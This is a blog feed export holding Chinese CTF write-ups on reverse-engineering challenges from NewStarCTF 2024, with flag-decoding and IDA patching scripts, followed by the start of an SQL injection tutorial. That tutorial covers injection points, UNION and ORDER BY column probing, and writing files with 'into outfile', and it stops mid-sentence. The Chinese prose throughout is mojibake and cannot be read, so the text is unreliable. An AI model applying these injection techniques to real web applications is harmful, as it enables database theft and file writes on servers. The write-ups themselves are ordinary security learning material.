0);</code>ï¼Œå®ƒå°±æ˜¯å…è®¸çˆ¶è¿›ç¨‹å¯¹è‡ªèº«è¿›è¡Œè°ƒè¯•çš„è¯­å¥ï¼Œç„¶ååœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œä½¿ç”¨  <code>PTRACE_POKEDATA</code>  å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œç„¶åä½¿ç”¨  <code>PTRACE_CONT</code>  è®©å­è¿›ç¨‹ç»§ç»­æ‰§è¡Œã€‚å› æ­¤æˆ‘ä»¬è¦å…³æ³¨çš„å°±æ˜¯çˆ¶è¿›ç¨‹å¯¹å­è¿›ç¨‹çš„ä»€ä¹ˆæ•°æ®è¿›è¡Œäº†ä¿®æ”¹</p><p>æˆ‘ä»¬èƒ½çœ‹åˆ°æœ‰è¯­å¥<code>ptrace(PTRACE_POKEDATA, addr, addr, 3);</code>ï¼Œå°±æ˜¯å°† <code>addr</code> æ‰€æŒ‡å‘çš„åœ°å€è¿›è¡Œäº†æ•°æ®ä¿®æ”¹ï¼Œæ›´æ”¹ä¸ºäº† <code>3</code>ï¼Œç‚¹è¿›å» <code>addr</code> æŒ‡å‘çš„å°±æ˜¯ <code>0x60004040</code> ä½ç½®çš„æ•°æ®</p><p><img src="https://img.dkdun.cn/v1/2024/12/671a98df4e205869.png"></p><p>è¿™ä¸ªåœ°å€åœ¨ <code>son</code> æ–‡ä»¶ä¸­ä¹Ÿå‡ºç°äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>  byte_60004080[i] = ((<span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="hljs-number">8</span> - dword_60004040));<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™ä¸ª <code>ptrace</code> ä¿®æ”¹çš„æ˜¯åç§»å€¼ï¼Œå°† 4 æ”¹ä¸ºäº† 3</p><p><img src="https://img.dkdun.cn/v1/2024/12/8470274afc084d5c.png"></p><p>å› æ­¤ï¼ŒæŒ‰ç…§åç§» 3 è¿›è¡Œé€†å‘å˜æ¢ï¼Œè„šæœ¬</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enc = [<span class="hljs-number">0xCC</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xED</span>,<br>       <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x6D</span>,<br>       <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAC</span>,<br>       <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAF</span>]<br>for i <span class="hljs-keyword">in</span> range(len(enc)):<br>    enc[i] = (enc[i] &lt;&lt; <span class="hljs-number">3</span> | enc[i] &gt;&gt; <span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xff</span><br>    print(chr(enc[i]), end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><h1 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h1><p>çœ‹äº†ä¸‹ wp éœ€è¦è„±å£³ï¼Œä½†æ˜¯æˆ‘æ‹¿åˆ°çš„é™„ä»¶å·²ç»æ˜¯è„±å¥½å£³çš„äº†ï¼Œæ‰€ä»¥ç›´æ¥çœ‹ä¼ªä»£ç </p><p>ä¸€èˆ¬è¿›è¡Œ upx è„±å£³æ–¹æ³•</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">upx</span> -d <span class="hljs-string">&quot;æ–‡ä»¶è·¯å¾„&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> status; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%22s&quot;</span>, s);<br>  RC4(s, key);<br>  <span class="hljs-keyword">for</span> ( status = <span class="hljs-number">0</span>; status &lt;= <span class="hljs-number">21</span>; ++status )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( s[status] != data[status] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is Wrong~&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(status);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is right~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º <code>22</code>ï¼Œç„¶åè¿›å…¥ <code>RC4</code> å‡½æ•°åŠ å¯†ï¼Œåç»­è¿›è¡Œ <code>for</code> å¾ªç¯ä¸­ï¼ŒæŠŠ<code>s</code> å’Œ <code>data</code> è¿›è¡Œæ¯”è¾ƒ</p><p>RC4 å‡½æ•°å†…å®¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">RC4</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, __int64 a2)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+15h] [rbp-Bh]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  init_sbox(a2);<br>  v6 = <span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= v6 )<br>      <span class="hljs-keyword">break</span>;<br>    v4 += sbox[++v3];<br>    swap(&amp;sbox[v3], &amp;sbox[v4]);<br>    a1[i] ^= sbox[(<span class="hljs-type">unsigned</span> __int8)(sbox[v3] + sbox[v4])];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>RC4 åŠ å¯†ï¼Œå¥½è®¨åŒå†™è§£å¯†ç®—æ³•ã€‚ã€‚ã€‚</p><p>çœ‹ wp å¯ä»¥è¿›è¡ŒåŠ¨è°ƒï¼Œåˆå­¦åˆ°äº†ï¼Œç›´æ¥ä¸‹æ–­ç‚¹</p><p><img src="https://img.dkdun.cn/v1/2024/12/0ed96784483aba17.png"></p><p>è¿™æ˜¯ <code>elf</code> æ–‡ä»¶ï¼Œæ‰€ä»¥åªèƒ½è¿œç¨‹åŠ¨è°ƒï¼Œè¿æ¥ kali</p><p><img src="https://img.dkdun.cn/v1/2024/12/30ea914294d8ad9b.png"></p><p>éšä¾¿è¾“å…¥å­—ç¬¦ä¸²ï¼Œæ–­ç‚¹æ–­åœ¨äº†åŠ å¯†å‡½æ•°ï¼ŒæŸ¥çœ‹æ•°æ®å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²</p><p>ç„¶åæ‰¾åˆ° <code>data</code> ï¼ŒæŠŠæ•°æ®æå–å‡ºæ¥</p><p><img src="https://img.dkdun.cn/v1/2024/12/0b7d89f3556bbcf9.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/4b329403b9e95b5f.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">from ida_bytes import *<br>addr = <span class="hljs-number">0x55FE34CF0040</span>//sçš„èµ·å§‹åœ°å€<br>enc = [<span class="hljs-number">0xC4</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x10</span>,<br>       <span class="hljs-number">0x56</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x9C</span>,<br>       <span class="hljs-number">0x75</span>, <span class="hljs-number">0xB5</span>]<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">22</span>):<br>    patch_byte(addr + i, enc[i])<br>print(<span class="hljs-string">&#x27;Done&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç‚¹è¿› <code>run</code> ä¹‹åï¼Œs å°±ä¼šæœ‰å˜åŒ–ï¼Œç„¶å f9 è¿è¡Œåˆä¼šæ–­åœ¨ä¸ <code>data</code> æ¯”è¾ƒçš„åœ°æ–¹ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹ <code>s</code> çš„å€¼ï¼Œä¸ä¹‹å‰åˆä¸ä¸€æ ·ï¼ŒæŒ‰ <code>a</code> å¯ä»¥è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼ˆåˆå­¦åˆ°äº†ï¼ï¼‰</p><p><img src="https://img.dkdun.cn/v1/2024/12/ced081c112845bbe.png"> </p><p>over~</p>]]></content>
    
    
    <categories>
      
      <category>åªå…³äº Reverse</category>
      
      <category>èµ›é¢˜å¤ç°</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week1</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B01/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B01/</url>
    
    <content type="html"><![CDATA[<p>å¤ç°å¤ç°ï¼çŒ«çŒ«è™«çœŸå¯çˆ±æ :)</p><span id="more"></span><h1 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h1><p>ida æ‰“å¼€</p><p><img src="https://img.dkdun.cn/v1/2024/12/45aba7af131703c1.png"></p><p>ä¸»è¦é€»è¾‘æ˜¯æ ¹æ®è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¦‚æœ<code>j%3==0</code> ï¼Œé‚£ä¹ˆå°±å°†è¾“å…¥çš„ç´¢å¼•ä¸º<code>j</code> çš„å€¼å‡å» <code>31</code>ï¼Œå¦‚æœ <code>j%3==1</code>ï¼ŒåŠ ä¸Š<code>41</code>,å¦‚æœ <code>j%3==2</code>ï¼Œé‚£ä¹ˆå’Œ <code>0x55</code> å¼‚æˆ–ã€‚ç„¶åå€¼ä¸ <code>buffer</code> æ•°ç»„ç›¸æ¯”è¾ƒï¼Œä¸€æ ·å°±æˆåŠŸï¼Œæ‰€ä»¥ç‚¹è¿›æ•°ç»„æå–æ•°æ®ã€‚</p><p><img src="https://img.dkdun.cn/v1/2024/12/71cd4fc66d472b65.png"></p><p>å¯ä»¥å†™å‡º python è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer = [<span class="hljs-number">0x47</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x16</span>,<br>          <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x5C</span>,<br>          <span class="hljs-number">0x07</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x28</span>,<br>          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buffer)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        buffer[i] += <span class="hljs-number">0x1f</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        buffer[i] -= <span class="hljs-number">0x29</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span>:<br>        buffer[i] ^= <span class="hljs-number">0x55</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(buffer[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h1><p>æˆ‘è®°å¾—ä¹‹å‰åœ¨å“ªä¸ªå¸ˆå‚…åšå®¢çœ‹åˆ°è¿‡è¯´å…ˆçœ‹ <code>.xml</code> æ–‡ä»¶çš„ <code>activity</code> å¯ä»¥å¿«é€Ÿæ‰¾åˆ°ã€‚</p><p>å¯¹äº apk æ–‡ä»¶å¯ä»¥å…ˆæ‹–è¿›æ¨¡æ‹Ÿå™¨è¿è¡Œçœ‹çœ‹é‡Œé¢æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œç„¶åçœ‹çœ‹æç¤º</p><p><img src="https://img.dkdun.cn/v1/2024/12/1225907047cea4d6.png"></p><p>æ‰€ä»¥æŸ¥çœ‹ <code>AndroidManifest.xml</code>ï¼Œçœ‹è§ <code>activity</code> åªæœ‰ <code>work.pangbai.ezandroidstudy.Homo</code> å’Œ <code>work.pangbai.ezandroidstudy.MainActivity</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/8cdfab6774a6a8c5.png"></p><p>æ‹¿åˆ° flag1</p><p><img src="https://img.dkdun.cn/v1/2024/12/51ac9c9e7e71f1e9.png"></p><p>çœ‹ä¸‹ä¸€ä¸ª</p><p><img src="https://img.dkdun.cn/v1/2024/12/f1ca7ebb6f9da41c.png"></p><p>åœ¨ <code>resources.arsc/res/value/string.xml</code> æ‰¾åˆ°äº†</p><p><img src="https://img.dkdun.cn/v1/2024/12/cdf9036f6f299c85.png"></p><p>ç»§ç»­çœ‹ä¸‹ä¸€ä¸ª</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd4cd1392593c483.png"></p><p><code>/layout/activity_main.xml</code> é‡Œçš„ <code>activity_main.xml</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/8fb3d0ba6b81c630.png"></p><p>æŸ¥æ‰¾ flag4</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd86d0f76ba83a70.png"></p><p>æ‰“å¼€ <code>/res/raw</code> å‘ç°ç›®å½•ä¸‹æœ‰ä¸ª <code>flag4.txt</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/bbfa8ee63b0b9c03.png"></p><p>flag 5</p><p><img src="https://img.dkdun.cn/v1/2024/12/6f609d03f4d2cc66.png"></p><p>éœ€è¦é€†å‘ so å±‚ï¼Œé‚£ä¹ˆå°† <code>.so</code> æå–å‡ºæ¥ï¼Œå¯ä»¥ä½¿ç”¨<code>apktool</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apktool</span> d ezAndroidStudy.apk -o <span class="hljs-string">&quot;éœ€è¦ç”Ÿæˆçš„æ–‡ä»¶å¤¹&quot;</span><br></code></pre></td></tr></table></figure><p> å°†<code>&quot;/lib/x86_64/libezandroidstudy.so&quot;</code>ä¸¢è¿› ida åç¼–è¯‘å°±å‡ºæ¥äº†</p><p><img src="https://img.dkdun.cn/v1/2024/12/94ea73f36dd81624.png"></p><h1 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h1><p>æ ¹æ®é¢˜ç›®ä¸¢è¿› <code>x64dbg</code> åŠ¨è°ƒ</p><p>é¦–å…ˆæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€äº› <code>flag</code> å­—æ ·</p><p><img src="https://img.dkdun.cn/v1/2024/12/c4ab9716a8f2bb1b.png"></p><p>åœ¨ <code>Decrypted flag</code> å¤„ä¸‹ä¸ªæ–­ç‚¹è¿è¡Œï¼Œå¾—åˆ°ç»“æœ</p><p><img src="https://img.dkdun.cn/v1/2024/12/be3f66141d6c7ac6.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/42e30da474972b02.png"></p><p>å¤ªå–œæ¬¢é€†å‘äº†æœ‰ç§åšä¸å‡ºæ¥ä½†åˆæƒ³åšçš„å´©æºƒæ„Ÿ</p>]]></content>
    
    
    <categories>
      
      <category>åªå…³äº Reverse</category>
      
      <category>èµ›é¢˜å¤ç°</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLæ³¨å…¥</title>
    <link href="/2024/11/10/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/10/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>ä»¥å‰ä¸€ç›´æä¸å¤ªæ‡‚ SQL æ³¨å…¥çš„ä¸€äº›ä¸œè¥¿ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦åŠ å•å¼•å·æˆ–åŒå¼•å·ï¼Œä¸ºä»€ä¹ˆæœ‰æ—¶å€™ç”¨ and ä½†æœ‰æ—¶å€™åˆç”¨ orï¼Œæœ€è¿‘çœ‹äº†ä¸€äº› SQL æ³¨å…¥çŸ¥è¯†ç‚¹ï¼Œæ‰€ä»¥æ€»ç»“ä¸€äº› qwq</p><span id="more"></span><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>å¯»æ‰¾åŠŸèƒ½ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œè¾¾åˆ°éé¢„æœŸæ‰§è¡Œæ•°æ®åº“è¯­å¥</p><p>æ¯”å¦‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = butt3rf1y;<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬åœ¨ä»¥ä¸‹åœ°æ–¹å®¹æ˜“å­˜åœ¨æ³¨å…¥ç‚¹ï¼š</p><p>URLå‚æ•°ï¼šä¾‹å¦‚åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²æˆ–è·¯å¾„ä¸­</p><p>è¡¨å•è¾“å…¥ï¼šåº”ç”¨ç¨‹åºä¸­çš„è¡¨å•è¾“å…¥æ¡†ï¼Œå¦‚ç”¨æˆ·åã€å¯†ç ã€æœç´¢æ¡†ç­‰ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼Œå°±å¯èƒ½æˆä¸º SQL æ³¨å…¥çš„ç›®æ ‡</p><p>Cookieï¼šå¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨ Cookie æ¥å­˜å‚¨ç”¨æˆ·ä¿¡æ¯æˆ–ä¼šè¯çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ Cookie ä¸­çš„å€¼æ¥è¿›è¡Œ SQL æ³¨å…¥</p><p>HTTPå¤´éƒ¨ï¼šæœ‰äº›åº”ç”¨ç¨‹åºå¯èƒ½ä¼šä» HTTP å¤´éƒ¨ä¸­è·å–æ•°æ®ï¼Œå¯ä»¥åœ¨ HTTP å¤´éƒ¨ä¸­è¿›è¡Œ SQL æ³¨å…¥</p><p>æ•°æ®åº“æŸ¥è¯¢è¯­å¥ï¼šå¦‚æœæœ‰æºç ï¼Œç›´æ¥è¿›è¡Œä»£ç å®¡è®¡ï¼Œå¯èƒ½æœ‰ç›´æ¥æ‹¼æ¥ SQL æŸ¥è¯¢è¯­å¥çš„åœ°æ–¹ï¼Œå­˜åœ¨ SQL æ³¨å…¥</p><h2 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h2><p><img src="/2024/11/06/TestWP/QLschema.png"></p><p>å¦‚ä¸Šå›¾ï¼Œæ•°æ®åº“çš„ç»“æ„ä¸º</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">+æ•°æ®åº“ <span class="hljs-function"><span class="hljs-params">(database)</span>--&gt;</span>ctf_database<br>+ - è¡¨_user <span class="hljs-function"><span class="hljs-params">(table_user)</span>--&gt;</span>user<br>+ - è¡¨_users <span class="hljs-function"><span class="hljs-params">(table_users)</span>--&gt;</span>users<br>+ + - åˆ—_id <span class="hljs-function"><span class="hljs-params">(column_id)</span>--&gt;</span>id<br>+ + - åˆ—_username <span class="hljs-function"><span class="hljs-params">(column_username)</span>--&gt;</span>username<br>+ + - åˆ—_password <span class="hljs-function"><span class="hljs-params">(column_password)</span>--&gt;</span>password<br>+ + + - æ•°æ®<br>+ + + - æ•°æ®<br></code></pre></td></tr></table></figure><h2 id="å¸¸ç”¨è¯­æ³•"><a href="#å¸¸ç”¨è¯­æ³•" class="headerlink" title="å¸¸ç”¨è¯­æ³•"></a>å¸¸ç”¨è¯­æ³•</h2><p><code>SECLECT</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> åˆ—å<span class="hljs-number">1</span>, åˆ—å<span class="hljs-number">2</span>, ... <span class="hljs-keyword">from</span> è¡¨å <span class="hljs-keyword">where</span> æ¡ä»¶<br></code></pre></td></tr></table></figure><p><code>UNION</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> åˆ—å<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> è¡¨å<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> åˆ—å<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> è¡¨å<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>union</code> çš„æ—¶å€™ä¸¤ä¸ªè¡¨åˆ—æ•°å¿…é¡»ç›¸åŒ</p><p><code>Order by</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> column1, column2, ... <span class="hljs-keyword">from</span> table_name [<span class="hljs-keyword">where</span> condition] <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> column_name<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬ç”¨æ¥åˆ¤æ–­åˆ—æ•°ï¼Œæ¯”å¦‚è¯´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">select column1ï¼Œcolumn2 from table_name order by 1;//ä¸æŠ¥é”™<br>select column1ï¼Œcolumn2 from table_name order by 2;//ä¸æŠ¥é”™<br>select column1ï¼Œcolumn2 from table_name order by 3;//æŠ¥é”™<br>//è¯´æ˜åªæœ‰2åˆ—<br></code></pre></td></tr></table></figure><h3 id="å¸¸ç”¨å‚æ•°"><a href="#å¸¸ç”¨å‚æ•°" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><p><code>user()</code>ï¼šå½“å‰æ•°æ®åº“ç”¨æˆ·</p><p><code>database()</code>ï¼šå½“å‰æ•°æ®åº“å</p><p><code>concat()</code>ï¼šè”åˆæ•°æ®ï¼Œç”¨äºè”åˆä¸¤æ¡æ•°æ®ã€‚æ¯”å¦‚ <code>concat(username,0x30,password)</code> å°† <code>username</code> å’Œ <code>password</code> é€šè¿‡ <code>:</code> è¿æ¥èµ·æ¥</p><p><code>group_concat</code>ï¼šå’Œ <code>concat</code> ç±»ä¼¼ï¼Œç”¨äºæŠŠå¤šæ¡æ•°æ®ä¸€æ¬¡æ³¨å…¥å‡ºæ¥</p><p><code>select xxoo into outfile &#39;è·¯å¾„&#39;</code>ï¼šæƒé™è¾ƒé«˜æ—¶å¯ç›´æ¥å†™æ–‡ä»¶</p><h1 id="åŸºæœ¬æ³¨å…¥ç±»å‹"><a href="#åŸºæœ¬æ³¨å…¥ç±»å‹" class="headerlink" title="åŸºæœ¬æ³¨å…¥ç±»å‹"></a>åŸºæœ¬æ³¨å…¥ç±»å‹</h1><h2 id="æ³¨å…¥ç±»å‹åˆ¤æ–­"><a href="#æ³¨å…¥ç±»å‹åˆ¤æ–­" class="headerlink" title="æ³¨å…¥ç±»å‹åˆ¤æ–­"></a>æ³¨å…¥ç±»å‹åˆ¤æ–­</h2><p>SQL å¤„ç†è¯­å¥åå°çš„å†™æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = ?<br></code></pre></td></tr></table></figure><p><code>?</code> 